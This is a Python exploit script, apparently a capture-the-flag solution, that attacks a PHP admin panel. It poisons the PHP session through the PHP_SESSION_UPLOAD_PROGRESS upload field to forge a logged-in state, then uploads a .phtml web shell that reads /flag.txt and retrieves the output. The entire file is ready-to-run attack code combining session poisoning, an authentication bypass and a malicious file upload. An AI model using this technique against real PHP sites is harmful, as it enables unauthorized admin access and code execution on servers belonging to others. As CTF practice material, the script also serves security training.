import requests
import urllib.parse

BASE_URL = "https://admin-panel-489a10b9570c.instancer.sekai.team"
SESSION_ID = "osuadminpwnd"

sess = requests.Session()
hostname = urllib.parse.urlparse(BASE_URL).hostname
sess.cookies.set("PHPSESSID", SESSION_ID, path="/", domain=hostname)
print("Initial cookies:", sess.cookies.get_dict())

poison_payload = "|a:0:{}logged_in|b:1;"
files = {
    "PHP_SESSION_UPLOAD_PROGRESS": (None, poison_payload),
    "username": (None, "peppy"),
    "password": (None, "anything"),
    "file": ("dummy.txt", "osu!", "text/plain"),
}

r1 = sess.post(f"{BASE_URL}/login.php", files=files, allow_redirects=False, timeout=10)
print("Poison status:", r1.status_code)
print("Cookies after poison:", sess.cookies.get_dict())

admin_page = sess.get(f"{BASE_URL}/admin.php", timeout=10)
print("Admin page status:", admin_page.status_code)
print("Admin page url:", admin_page.url)
print("Logged in?", "admin panel" in admin_page.text.lower())
print("Cookies after admin get:", sess.cookies.get_dict())

shell_body = "<?=file_get_contents('/flag.txt');?>"
shell_files = {
    "file": ("shell.phtml", shell_body, "application/octet-stream"),
}
r2 = sess.post(f"{BASE_URL}/admin.php", files=shell_files, allow_redirects=False, timeout=10)
print("Upload status:", r2.status_code)
print("Upload headers:", r2.headers)
print("Cookies after upload:", sess.cookies.get_dict())

location = r2.headers.get("Location")
print("Redirect location:", location)
if location:
    if not location.startswith("http"):
        if not location.startswith("/"):
            location = "/" + location
        location = f"{BASE_URL}{location}"
    flag_resp = sess.get(location, timeout=10)
    print("Flag status:", flag_resp.status_code)
    print("Flag url:", flag_resp.url)
    print("Flag body snippet:", flag_resp.text.strip()[:200])
